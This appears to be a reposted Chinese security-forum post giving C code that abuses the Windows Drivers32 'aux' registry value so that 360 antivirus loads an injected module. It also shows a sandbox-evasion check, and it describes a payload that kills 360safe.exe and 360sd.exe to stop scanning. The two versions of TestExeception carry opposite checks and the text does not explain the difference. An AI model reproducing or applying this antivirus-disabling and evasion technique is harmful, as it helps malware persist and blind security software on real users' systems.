
# 让 360 加载我们的模块（你干什么都行）

> 原文：[`www.pediy.com/kssd/pediy12/132232.html`](https://www.pediy.com/kssd/pediy12/132232.html)

只在 XP 下面测试通过，发现之前杀毒软件是扫不出来的，最近测试快速扫描会扫描出有非法启动项，但是还是可以过主动的，可以一上来就干掉 `360safe.exe` 和 `360sd.exe` 让他不能扫描。

测试代码是这样的：

```c
BOOL MyDllRun(char* dllPath)
{
  HKEY hkey=NULL;
  if(RegOpenKeyExA(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Drivers32",0,KEY_ALL_ACCESS,&hkey)==S_OK)
  {
        if(RegSetValueEx(hkey,"aux",0,REG_SZ,(LPBYTE)dllPath,strlen(dllPath))==S_OK)
      return TRUE;
  }
  return FALSE;
}

VOID TestExeception()
{
  // 通过杀毒软件目录的不可读写来反虚拟执行
  char buf[255]={0};
  GetModuleFileName(NULL,buf,255);
  PathRemoveFileSpec(buf);
  PathAppend(buf,"9.txt");
  HANDLE hfile=CreateFile(buf,GENERIC_ALL,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL|FILE_FLAG_DELETE_ON_CLOSE,NULL);
  if(hfile!=INVALID_HANDLE_VALUE)
  {
    ExitProcess(0);
  }
  MyDllRun("e:\\123.sys");
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd )
{
  TestExeception();
  return 0;
}
```

上面主要是写入注册表，`MyDllRun` 传入一个需要 360 注入的模块路径，运行 360 的时候回加载。

我的 `123.sys` 的代码是检测加载的模块是不是 `360sd` 和 `360safe`，是的话就 `ExitProcess(0);` 这个误杀率极高的杀毒软件就起不来了。

```c
VOID TestExeception()
{
  // 通过杀毒软件目录的不可读写来反虚拟执行
  char buf[255]={0};
  GetModuleFileName(NULL,buf,255);
  PathRemoveFileSpec(buf);
  PathAppend(buf,"9.txt");
  HANDLE hfile=CreateFile(buf,GENERIC_ALL,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL|FILE_FLAG_DELETE_ON_CLOSE,NULL);
  if(hfile==INVALID_HANDLE_VALUE)
  {
    ExitProcess(0);
  }
  MyDllRun("e:\\123.sys");
}
```
